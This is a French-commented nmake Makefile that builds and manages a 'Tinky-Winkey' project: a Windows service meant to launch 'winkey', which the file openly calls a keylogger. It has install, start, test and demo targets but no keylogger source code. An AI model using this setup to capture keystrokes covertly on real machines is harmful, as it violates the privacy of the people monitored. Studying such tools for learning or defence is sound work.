# Makefile principal pour Tinky-Winkey Project
# Compile les deux sous-projets : tinky (service) et winkey (keylogger)

# Variables
TINKY_DIR = tinky
WINKEY_DIR = winkey
MAKE = nmake

# Règle par défaut - compile tout
all: tinky winkey
	@echo.
	@echo === Compilation terminee ===
	@echo Service tinky : $(TINKY_DIR)\svc.exe
	@echo Keylogger     : $(WINKEY_DIR)\main.exe

# Compilation du service tinky
tinky: $(TINKY_DIR)\svc.exe

$(TINKY_DIR)\svc.exe: $(TINKY_DIR)\svc.c $(TINKY_DIR)\cli.c $(TINKY_DIR)\token.c $(TINKY_DIR)\cli.h $(TINKY_DIR)\token.h
	@echo === Compilation du service Tinky ===
	cd $(TINKY_DIR) && $(MAKE)

# Compilation du keylogger winkey
winkey: $(WINKEY_DIR)\main.exe

$(WINKEY_DIR)\main.exe: $(WINKEY_DIR)\main.c $(WINKEY_DIR)\winkey.h
	@echo === Compilation du keylogger WinKey ===
	cd $(WINKEY_DIR) && $(MAKE)

# Installation complète (service + keylogger)
install: tinky
	@echo === Installation du service Tinky ===
	cd $(TINKY_DIR) && $(MAKE) install

# Démarrage du service
start: tinky
	@echo === Demarrage du service Tinky ===
	cd $(TINKY_DIR) && $(MAKE) start

# Arrêt du service
stop:
	@echo === Arret du service Tinky ===
	cd $(TINKY_DIR) && $(MAKE) stop

# Désinstallation du service
uninstall:
	@echo === Desinstallation du service Tinky ===
	cd $(TINKY_DIR) && $(MAKE) uninstall

# Statut du service
status:
	@echo === Statut du service Tinky ===
	cd $(TINKY_DIR) && $(MAKE) status

# Test du keylogger seul
test-winkey: winkey
	@echo === Test du keylogger WinKey ===
	cd $(WINKEY_DIR) && $(MAKE) run

# Compilation des démos
demo:
	@echo === Compilation des demos ===
	cd $(WINKEY_DIR) && $(MAKE) demo

# Exécution des démos
run-demo: demo
	@echo === Execution des demos ===
	cd $(WINKEY_DIR) && $(MAKE) run-demo

# Nettoyage complet
clean:
	@echo === Nettoyage du projet Tinky ===
	cd $(TINKY_DIR) && $(MAKE) clean
	@echo === Nettoyage du projet WinKey ===
	cd $(WINKEY_DIR) && $(MAKE) clean

# Nettoyage très complet (inclut les logs)
distclean:
	@echo === Nettoyage complet du projet Tinky ===
	cd $(TINKY_DIR) && $(MAKE) fclean
	@echo === Nettoyage complet du projet WinKey ===
	cd $(WINKEY_DIR) && $(MAKE) distclean

# Rebuild complet
rebuild: clean all

# Force la recompilation même si les fichiers semblent à jour
force-tinky:
	@echo === Force recompilation du service Tinky ===
	cd $(TINKY_DIR) && $(MAKE)

force-winkey:
	@echo === Force recompilation du keylogger WinKey ===
	cd $(WINKEY_DIR) && $(MAKE)

force-all: force-tinky force-winkey

# Compilation debug des deux projets
debug:
	@echo === Compilation debug du service Tinky ===
	cd $(TINKY_DIR) && $(MAKE) debug
	@echo === Compilation debug du keylogger WinKey ===
	cd $(WINKEY_DIR) && $(MAKE) debug

# Compilation release des deux projets
release:
	@echo === Compilation release du service Tinky ===
	cd $(TINKY_DIR) && $(MAKE) release
	@echo === Compilation release du keylogger WinKey ===
	cd $(WINKEY_DIR) && $(MAKE) release

# Vérification syntaxe des deux projets
check:
	@echo === Verification syntaxe du service Tinky ===
	cd $(TINKY_DIR) && $(MAKE) check
	@echo === Verification syntaxe du keylogger WinKey ===
	cd $(WINKEY_DIR) && $(MAKE) check

# Informations sur les projets
info:
	@echo === Informations du projet Tinky-Winkey ===
	@echo.
	@echo Structure du projet :
	@echo   $(TINKY_DIR)/     - Service Windows pour lancer winkey
	@echo   $(WINKEY_DIR)/    - Keylogger principal
	@echo.
	@echo === Informations Tinky ===
	cd $(TINKY_DIR) && $(MAKE) info
	@echo.
	@echo === Informations WinKey ===
	cd $(WINKEY_DIR) && $(MAKE) info

# Aide complète
help:
	@echo Makefile principal Tinky-Winkey - Options disponibles:
	@echo.
	@echo === COMPILATION ===
	@echo   all         - Compile tinky et winkey (defaut)
	@echo   tinky       - Compile uniquement le service
	@echo   winkey      - Compile uniquement le keylogger
	@echo   debug       - Compile les deux en mode debug
	@echo   release     - Compile les deux en mode release
	@echo   rebuild     - Nettoyage complet puis recompilation
	@echo.
	@echo === SERVICE MANAGEMENT ===
	@echo   install     - Installe le service tinky (admin requis)
	@echo   start       - Demarre le service
	@echo   stop        - Arrete le service
	@echo   uninstall   - Desinstalle le service
	@echo   status      - Affiche le statut du service
	@echo.
	@echo === TESTS ET DEMOS ===
	@echo   test-winkey - Teste le keylogger directement
	@echo   demo        - Compile les demos
	@echo   run-demo    - Execute les demos
	@echo.
	@echo === MAINTENANCE ===
	@echo   clean       - Supprime les fichiers objets/executables
	@echo   distclean   - Supprime tout (inclut logs)
	@echo   check       - Verifie la syntaxe des deux projets
	@echo   info        - Affiche les informations des projets
	@echo   help        - Affiche cette aide
	@echo.
	@echo === UTILISATION TYPIQUE ===
	@echo   nmake                    - Compiler tout
	@echo   nmake install           - Installer le service (admin)
	@echo   nmake start             - Demarrer le service
	@echo   nmake test-winkey       - Tester winkey directement
	@echo   nmake stop              - Arreter le service
	@echo   nmake clean             - Nettoyer

# Déclaration des cibles qui ne correspondent pas à des fichiers
.PHONY: all tinky winkey install start stop uninstall status test-winkey demo run-demo clean distclean rebuild debug release check info help force-tinky force-winkey force-all